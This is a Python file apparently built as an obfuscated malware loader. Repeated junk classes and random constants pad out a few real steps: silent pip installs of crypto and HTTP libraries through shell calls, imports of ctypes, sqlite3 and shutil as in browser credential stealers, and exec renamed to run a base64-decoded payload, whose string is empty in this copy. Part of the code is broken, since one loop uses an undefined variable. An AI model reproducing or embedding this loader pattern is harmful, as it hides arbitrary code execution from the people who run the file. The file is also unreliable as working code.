

from sys import executable, stderr
'OEavTUlvdx'
class oFJTErGedc:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class GngbOemDpW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
VYo57GzO0k = 36766525
qsnfDxXprb = 19711889
["'kvvLkaA8xT'", "'roV6FwBgOh'", "'nxS3QPGq4b'", "'cG2SN6vKo8'"]
YpfEMQkDzT = 71185012
{'username': 'jqmJNKO', 'age': 81}
Ipdo8QZsyX = 50081405
xCk6tjfnQv = 40225806
Q1l8nlJkfB = 40568159
class tFf05CaQPR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FzjWkPbBEQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OhU2L0zoMJ = 58529766
class bvbYiQO5gb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qewygt2rjd:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
eV9RT2Qyuj = 96872080
dTkdYfWBcK = 5206964
zMwMirdA2R = 11414671
class tQPOaKXdkW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class XwNklErwgs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class xEOjbs0RZX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class AV45Hi9sCu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
'OEavTUlvdx'
class oFJTErGedc:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class GngbOemDpW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
VYo57GzO0k = 36766525
qsnfDxXprb = 19711889
["'kvvLkaA8xT'", "'roV6FwBgOh'", "'nxS3QPGq4b'", "'cG2SN6vKo8'"]
YpfEMQkDzT = 71185012
{'username': 'jqmJNKO', 'age': 81}
Ipdo8QZsyX = 50081405
xCk6tjfnQv = 40225806
Q1l8nlJkfB = 40568159
class tFf05CaQPR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FzjWkPbBEQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OhU2L0zoMJ = 58529766
class bvbYiQO5gb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qewygt2rjd:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
eV9RT2Qyuj = 96872080
dTkdYfWBcK = 5206964
zMwMirdA2R = 11414671
class tQPOaKXdkW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class XwNklErwgs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class xEOjbs0RZX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class AV45Hi9sCu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
b9cZnvnUMfAXcFoACnfDLAeQXvQwzCx5HzcnLZ = exec
'OEavTUlvdx'
class oFJTErGedc:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class GngbOemDpW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
VYo57GzO0k = 36766525
qsnfDxXprb = 19711889
["'kvvLkaA8xT'", "'roV6FwBgOh'", "'nxS3QPGq4b'", "'cG2SN6vKo8'"]
YpfEMQkDzT = 71185012
{'username': 'jqmJNKO', 'age': 81}
Ipdo8QZsyX = 50081405
xCk6tjfnQv = 40225806
Q1l8nlJkfB = 40568159
class tFf05CaQPR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FzjWkPbBEQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OhU2L0zoMJ = 58529766
class bvbYiQO5gb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qewygt2rjd:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
eV9RT2Qyuj = 96872080
dTkdYfWBcK = 5206964
zMwMirdA2R = 11414671
class tQPOaKXdkW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class XwNklErwgs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class xEOjbs0RZX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class AV45Hi9sCu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
Zxx5LSKIMCd7sQChfmhhJaxdDbkwSQrHrScuFf=""
b9cZnvnUMfAXcFoACnfDLAeQXvQwzCx5HzcnLZ(base64.b64decode(Zxx5LSKIMCd7sQChfmhhJaxdDbkwSQrHrScuFf))
'OEavTUlvdx'
class oFJTErGedc:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class GngbOemDpW:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
VYo57GzO0k = 36766525
qsnfDxXprb = 19711889
["'kvvLkaA8xT'", "'roV6FwBgOh'", "'nxS3QPGq4b'", "'cG2SN6vKo8'"]
YpfEMQkDzT = 71185012
{'username': 'jqmJNKO', 'age': 81}
Ipdo8QZsyX = 50081405
xCk6tjfnQv = 40225806
Q1l8nlJkfB = 40568159
class tFf05CaQPR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class FzjWkPbBEQ:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
OhU2L0zoMJ = 58529766
class bvbYiQO5gb:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class qewygt2rjd:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
eV9RT2Qyuj = 96872080
dTkdYfWBcK = 5206964
zMwMirdA2R = 11414671
class tQPOaKXdkW:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class XwNklErwgs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class xEOjbs0RZX:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class AV45Hi9sCu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data